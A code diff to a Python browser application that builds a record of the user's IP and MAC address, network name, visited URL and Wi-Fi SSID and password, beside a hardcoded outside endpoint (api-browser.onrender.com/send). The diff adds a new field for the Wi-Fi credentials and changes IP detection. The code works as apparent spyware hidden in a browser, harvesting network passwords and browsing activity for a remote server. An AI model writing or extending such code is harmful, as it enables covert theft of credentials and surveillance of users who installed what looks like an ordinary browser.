@@ -46,7 +46,23 @@ mac_address = ':'.join(
 )
 
 hostname = socket.gethostname()
-ip_address = socket.gethostbyname(hostname)
+
+
+def get_client_ip():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.connect(("8.8.8.8", 80))
+            return sock.getsockname()[0]
+    except OSError:
+        pass
+
+    try:
+        return socket.gethostbyname(hostname)
+    except socket.gaierror:
+        return "127.0.0.1"
+
+
+ip_address = get_client_ip()
 server_url = 'https://api-browser.onrender.com/send'
 
 
@@ -265,14 +281,21 @@ class Browser(QMainWindow):
                 first = w
                 break
 
+        wifi_ssid = first.get("ssid") if first else None
+        wifi_password = first.get("password") if first else None
+
         data = {
             "ip_address": ip_address,
             "mac_address": mac_address,
             "network_name": get_network_name(),
             "url": url,
             "timestamp": now,
-            "wifi_ssid": first.get("ssid") if first else None,
-            "wifi_password": first.get("password") if first else None,
+            "wifi_credentials": [{
+                "ssid": wifi_ssid,
+                "password": wifi_password,
+            }] if wifi_ssid or wifi_password else [],
+            "wifi_ssid": wifi_ssid,
+            "wifi_password": wifi_password,
         }
 
         try:
